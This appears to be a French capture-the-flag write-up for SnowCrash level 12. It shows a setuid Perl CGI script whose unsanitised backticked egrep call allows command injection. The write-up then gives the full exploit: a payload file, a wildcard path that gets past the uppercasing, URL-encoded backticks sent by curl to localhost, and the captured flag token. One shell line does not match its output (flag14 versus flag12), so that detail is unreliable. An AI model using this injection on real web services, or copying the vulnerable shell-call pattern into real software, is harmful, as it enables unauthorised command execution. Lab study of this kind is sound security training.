
# **Level 12**

Pour le level12, nous avons un fichier en `.pl` qui semble faire tourner un server en `localhost:4646`

```
level12@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
level12@SnowCrash:~$ cat level12.pl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}
```

Le programme prend le premier argument, met tout en majuscule et coupe la string au premier espace ensuite egrep est appeler en prenant cette string modifier en argument

En mettant des quotes `( `` )` la string contenue dqns ces quotes est executer par egrep mais le probleme est que ces quotes sont aussi interpreter par le terminal, donc on outrepasser se probleme on peux encoder la string qu'on passe en arguments avec l'encodage url

Ensuite on ne peux pas directement ecrire getflag car les caracteres sont passer en majuscules

Donc on creer un fichier `A`

```
level12@SnowCrash:/var/crash$ touch A
level12@SnowCrash:/var/crash$ echo '$(getflag > /var/crash/flag14)' > A
level12@SnowCrash:/var/crash$ cat A
$(getflag > /var/crash/flag12)
level12@SnowCrash:/var/crash$ chmod 777 A
```

On convertie ``` `/*/*/A` ``` en url encode string

> %60%2f%2a%2f%2a%2f%41%60

On fais la requete

```
level12@SnowCrash:/var/crash$ curl "127.0.0.1:4646/?x=%60%2f%2a%2f%2a%2f%41%
60"
level12@SnowCrash:/var/crash$ cat flag12
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

> ### NEXT : [Level 13](/level13/resources/README.md)
